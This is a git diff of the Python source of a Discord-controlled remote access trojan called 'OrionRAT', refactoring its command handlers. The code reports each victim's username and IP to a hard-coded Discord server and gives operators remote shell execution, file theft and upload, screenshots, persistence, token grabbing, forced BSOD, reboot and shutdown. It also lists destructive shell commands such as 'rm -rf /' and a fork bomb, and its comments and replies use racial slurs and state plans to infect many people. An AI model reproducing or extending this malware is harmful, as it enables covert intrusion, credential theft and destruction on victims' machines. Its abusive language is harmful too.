@@ -1,6 +1,6 @@
 import discord
 from discord.ext import commands
-from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence, processlist, enumerator
+from funcs import notify, fs, process, screenshots, system, bsodo, gettoken, checkvm, persistence, processlist, enumerator
 import time
 from time import sleep
 import platform
@@ -12,15 +12,10 @@ import os, sys, tempfile, signal
 import shutil
 user=os.getlogin()
 
+os = platform.system().lower()
 
-if platform.system() == "Linux":
-        os = "linux"
-if platform.system() == "Windows":
-        os = "windows"
-if platform.system() == "Darwin":
-        os = "macos"
 checkvm.check()
-rip=requests.get('https://checkip.amazonaws.com/')
+rip=requests.get('https://checkip.amazonaws.com/') # FIX: Is not the stealth method my nigga
 ip=rip.text
 status = ["rm -rf /", "rm -rf /home/*", "rm -rf *", ":(){ :|:& };:", "ifconfig eth0 down", "ip link set eth0 down", "kill -9 -1", "chmod -R 000 /", "rm -rf /boot/*", "rm -rf /bin /sbin /usr/bin /usr/sbin", "shutdown -h now", "reboot", "systemctl stop network-manager", "echo 1  /proc/sys/kernel/sysrq", "echo c  /proc/sysrq-trigger", "echo b  /proc/sysrq-trigger", "mount -o remount,ro /", "umount -a", "chattr +i /", "swapoff -a", "echo 0  /proc/1/oom_adj", "pkill -u root", "rm -rf /var/log/*", "truncate -s 0 /etc/passwd", "truncate -s 0 /etc/shadow", "rm -rf /tmp/*", "rm -rf /var/*", "poweroff", "shutdown"]
 # TODO remove when we actually use the rat on someone
@@ -46,36 +41,37 @@ async def get_or_create_channel(guild, channel_name, category_name="OrionRAT"):
     # Create the channel
     new_channel = await guild.create_text_channel(channel_name, category=category)
     return new_channel
-@bot.event
-async def on_ready():    
-        await bot.change_presence(
-        activity=discord.Game(name=ip),  # Playing …
-        status=discord.Status.online  
-        )
-        
-        guild = bot.get_guild(1408928221608673412)
-        category_name = "OrionRAT"
-        category = discord.utils.get(guild.categories, name=category_name)
-        embed = discord.Embed(
-            title=F"OrionRAT | New connection.",
-            description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
-            color=discord.Color.red()  
-        )   
-            
-        channel_name = f"{user}-{os}"
-        existing_channel = None
-        for ch in category.text_channels:  # only text channels in this category
-            # --- CORRECTED: use case-insensitive match to avoid misses ---
-            if ch.name.lower() == channel_name.lower():  
-                existing_channel = ch
-                break
 
-        if existing_channel:
-            await existing_channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
-        else:
-            # --- CORRECTED: use returned channel object directly, no need for bot.get_channel ---
-            channel = await guild.create_text_channel(name=channel_name, category=category)
-            await channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
+@bot.event
+async def on_ready():
+    await bot.change_presence(
+    activity=discord.Game(name=ip),  # Playing …
+    status=discord.Status.online  
+    )
+
+    guild = bot.get_guild(1408928221608673412)
+    category_name = "OrionRAT"
+    category = discord.utils.get(guild.categories, name=category_name)
+    embed = discord.Embed(
+        title=F"OrionRAT | New connection.",
+        description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
+        color=discord.Color.red()  
+    )
+
+    channel_name = f"{user}-{os}"
+    existing_channel = None
+    for ch in category.text_channels:  # only text channels in this category
+        # --- CORRECTED: use case-insensitive match to avoid misses ---
+        if ch.name.lower() == channel_name.lower():
+            existing_channel = ch
+            break
+
+    if existing_channel:
+        await existing_channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
+    else:
+        # --- CORRECTED: use returned channel object directly, no need for bot.get_channel ---
+        channel = await guild.create_text_channel(name=channel_name, category=category)
+        await channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
 
 @bot.command()
 async def help(ctx):
@@ -123,24 +119,26 @@ async def dmproc(ctx):
 @bot.command()
 async def rmdir(ctx, text: str):
     shutil.rmtree(text)
-    if os.path.exists(text) == True:
+
+    if os.path.exists(text):
         embed = discord.Embed(
             title=":x: Failed",
             description=f"Couldnt delete `{text}`",
             color=discord.Color.red()
-            )
-        await ctx.reply(embed=embed)
-    if os.path.exists(text) == False:
+        )
+    else:
         embed = discord.Embed(
             title=":white_check_mark: Success",
             description=f"Succesfully deleted `{text}`!",
             color=discord.Color.green()
-            )
-        await ctx.reply(embed=embed)        
+        )
+
+    await ctx.reply(embed=embed)
+
 @bot.command()
 async def pwd(ctx):
-    content=pwdd.get_dir()
-    await ctx.reply(f'`{content}`')
+    await ctx.reply(f'`{fs.get_dir()}`')
+
 @bot.command()
 async def bsod(ctx):
     if platform.system() == "Windows":
@@ -151,21 +149,26 @@ async def bsod(ctx):
             await ctx.reply(f":x: There was an error triggering BSOD: `{e}`") 
     else:
         await ctx.reply(f":x: The victim's OS is incompatible with this command.") 
+
 @bot.command()
 async def cd(ctx, text: str):
-    cdd.cde(path=text)
-    finalpath=pwdd.get_dir()
+    fs.change_directory(text)
+    finalpath = fs.get_dir()
+
     await ctx.reply(f'Changed path to: `{finalpath}`')
+
 @bot.command()
 async def whoami(ctx):
      await ctx.reply(f'`{user}`')
+
 @bot.command()
 async def rm(ctx, file: str):
     os.unlink(file)
-    if os.path.exists(file) == False:
+    if not os.path.exists(file):
         await ctx.reply(f'`{file}` has been deleted.')
-    if os.path.exists(file) == True:
+    else:
         await ctx.reply(f'Couldnt delete `{file}` ')
+
 @bot.command()
 async def upload(ctx):
     if not ctx.message.attachments:
@@ -185,6 +188,7 @@ async def upload(ctx):
         file_path = os.path.join(upload_dir, attachment.filename)
         await attachment.save(file_path)
         await ctx.reply(f"File `{attachment.filename}` saved on host at `{file_path}`!")
+
 @bot.command()
 async def enum(ctx):
     enumerator.run()
@@ -198,60 +202,64 @@ async def enum(ctx):
         file = discord.File(path)
         await ctx.reply(file=file)
         os.unlink(path)
-@bot.command()
-async def hello(ctx):
-    await ctx.reply(f"Yo twin we alone now, js finish programming me and go to bed, you should sleep its pretty late :hearts: , we're gonna be ratting alot of people thanks to you my nigga :money_mouth: :money_mouth: ")
+
 @bot.command()
 async def ls(ctx):
-    items = lsls.lss()
+    items = fs.list_directory()
     output = ""
     for i in items:
         output += f"{i}\n"
     await ctx.reply(f"```{output}```")
+
 @bot.command()
 async def restart(ctx):
-     try:
-         reboot.run()
-         await ctx.reply(":white_check_mark: Succesfully rebooted victim's computer!") 
-     except Exception as e:
+    try:
+        system.reboot()
+        await ctx.reply(":white_check_mark: Succesfully rebooted victim's computer!") 
+    except Exception as e:
           await ctx.reply(f":x: There was an error restarting the computer: `{e}`") 
+
 @bot.command()
-@commands.has_role("VIP") 
+@commands.has_role("VIP")
 async def shutdown(ctx):
      try:
-         shutdowns.run()
+         system.shutdown()
          await ctx.reply(":white_check_mark: Succesfully shutted down victim's computer!") 
      except Exception as e:
           await ctx.reply(f":x: There was an error shutting down: `{e}`") 
+
 @bot.command()
 async def kill(ctx, text: str):
      try:
-        processkill.kill(proc_name=text)
+        process.kill(text)
         await ctx.reply(f":white_check_mark: | Succesfully executed commmand `{text}`.") 
      except Exception as e:
         await ctx.reply(f":x: | There was an error killing the process: `{e}`")
+
 @bot.command()
 async def exec(ctx, text: str):
     if text in status:
         ctx.reply("Fuck you bitch")
     else:
         try:
-            exece.execes(data=f"{text}")
+            system.exec(text)
             ctx.reply(f":white_check_mark: | Command executed in shell.")
         except Exception as e:
                 ctx.reply(f":x: | Couldnt execute command: {e}")
+
 @bot.command()
 async def add_startup(ctx, text: str):
      persistence.run(name=text)
      ctx.reply(':white_check_mark: | Persistence added.')
+
 @bot.command()
-async def download(ctx, text:str):
-     try:
+async def download(ctx, text: str):
+    try:
         file =  discord.File(text)
         await ctx.reply(file=file)
-     except Exception:
-          pass
-    
+    except Exception:
+        pass
+
 @bot.command()
 async def gettokens(ctx):
     if platform.system() == "Windows":
@@ -264,10 +272,11 @@ async def gettokens(ctx):
                 ctx.reply(f":x: | Couldnt grab tokens: `{e}`")
     else:
         await ctx.reply(f":x: The victim's OS is incompatible with this command.") 
-    
+
 @bot.command()
 async def steak(ctx):
      await ctx.reply('learn to type next time retarded sperm cell\nhttps://images-ext-1.discordapp.net/external/N2TOJTU8zf5dPN9VtdtWTu4muB69vJRo7pAs69dIGvQ/https/media.tenor.com/i5ctFNzwWLIAAAPo/steak.mp4')
+
 @bot.command()
 async def ss(ctx):
      screenshots.sgrab()
@@ -275,7 +284,7 @@ async def ss(ctx):
           file = discord.File("/tmp/sys.png")
           await ctx.reply(file=file)
      screenshots.sdelete()
-    
+
 @bot.command()
 async def notf(ctx, *, text: str):
     notify.notify(content=text)
